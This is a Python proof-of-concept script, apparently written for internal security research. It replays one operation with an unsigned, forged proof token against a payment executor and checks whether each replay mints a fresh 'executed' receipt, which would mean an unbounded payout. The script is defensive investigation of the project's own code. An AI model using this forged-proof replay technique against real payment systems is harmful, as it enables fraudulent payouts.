#!/usr/bin/env python3
"""
Follow-up investigation: does replaying the SAME operation_id with an
UNSIGNED PCCB, many times, mint a FRESH, uniquely-IDed 'executed' Receipt
each time? If a downstream ledger credits money per distinct receipt_id
(the natural way to consume a receipt stream), this is unbounded free
money for the attacker, not just a one-time harmless replay.
"""
import sys
from pathlib import Path

# This script lives at <repo>/security-research/investigate_unbounded_receipts.py,
# so its repo root is two levels up. Resolve it dynamically instead of a
# hardcoded machine-specific path, so it works from any checkout.
_REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO_ROOT))
sys.path.insert(0, str(_REPO_ROOT / "tests"))

import tempfile
from dataclasses import replace

from actenon.execution.protected_executor import ProtectedExecutor
from actenon.idempotency import IdempotencyStore
from actenon.models.runtime import ProtectedExecutionRequest
from actenon.proof import PCCBVerifier, VerifierDisclosureMode
from actenon.replay import ReplayProtector, SqliteReplayStore

from tests.security.helpers import (
    build_security_context,
    build_security_intent,
    mint_security_pccb,
    security_signer,
    unsigned_pccb_with_action_hash,
)


class _Broker:
    from actenon.credentials import BrokeredCredential
    from datetime import timedelta

    def acquire(self, intent, pccb, context):
        return self.BrokeredCredential(
            credential_id="cred_test",
            issued_at=context.now,
            expires_at=context.now + self.timedelta(minutes=5),
            scope=("test",),
        )

    def release(self, credential, result):
        pass


def main() -> int:
    with tempfile.TemporaryDirectory() as tempdir:
        replay_db = tempfile.mktemp(suffix=".sqlite3", dir=tempdir)
        executor = ProtectedExecutor(
            proof_verifier=PCCBVerifier(security_signer(), disclosure_mode=VerifierDisclosureMode.LOCAL_DEBUG),
            credential_broker=_Broker(),
            replay_protector=ReplayProtector(SqliteReplayStore(replay_db)),
            idempotency_store=IdempotencyStore(),
        )

        operation_id = "op_unbounded_demo"
        amount = 1000
        intent1 = replace(build_security_intent(amount_minor=amount), metadata={"operation_id": operation_id})
        context1 = build_security_context()
        pccb1 = mint_security_pccb(intent=intent1, context=context1)
        request1 = ProtectedExecutionRequest(intent=intent1, pccb=pccb1, context=context1)

        def handler(req, cred):
            return {"result": "money_moved", "amount_minor": amount}

        result1 = executor.execute(request1, handler)
        print(f"Legit execution #0: receipt_id={result1.receipt.receipt_id}, outcome={result1.receipt.outcome}")

        forged_pccb = unsigned_pccb_with_action_hash(intent1, context1)
        successful_receipt_ids: set[str] = set()
        N = 10
        print(f"\nReplaying with an UNSIGNED PCCB {N} times (same operation_id, no valid signature)...")
        for i in range(1, N + 1):
            request_i = ProtectedExecutionRequest(intent=intent1, pccb=forged_pccb, context=context1)
            result_i = executor.execute(request_i, handler)
            # Only count a replay as a confirmed free payout if it actually
            # executed successfully with the expected payload — a properly
            # fixed executor would refuse every one of these (still minting
            # a distinct refusal artifact each time), and that must NOT be
            # misread as ten confirmed executions.
            executed = (
                result_i.refusal is None
                and result_i.receipt is not None
                and result_i.receipt.outcome == "executed"
                and result_i.payload is not None
                and result_i.payload.get("amount_minor") == amount
            )
            rid = result_i.receipt.receipt_id if (executed and result_i.receipt) else None
            print(f"  replay #{i}: refusal={result_i.refusal}, executed={executed}, receipt_id={rid}, "
                  f"amount claimed={result_i.payload.get('amount_minor') if result_i.payload else None}")
            if executed and rid is not None:
                successful_receipt_ids.add(rid)

        print(f"\nDistinct SUCCESSFUL receipt_ids minted across {N} forged replays: {len(successful_receipt_ids)}")
        if len(successful_receipt_ids) == N:
            print(f"[CONFIRMED] Every single forged replay minted a BRAND-NEW, uniquely-numbered")
            print(f"'executed' receipt for {amount} minor units, with NO valid signature checked")
            print(f"after the very first legitimate call. A downstream ledger that credits money")
            print(f"per distinct receipt_id (the normal way to consume a receipt stream) would pay")
            print(f"out {N} x {amount} = {N * amount} minor units for ONE real authorization.")
            print(f"This scales with however many requests the attacker is willing to send: UNBOUNDED.")
            return 0
        print(f"\n[NOT CONFIRMED] Not every forged replay produced a successful, distinct execution "
              f"receipt — either the kernel refuses forged replays here, or something else changed.")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
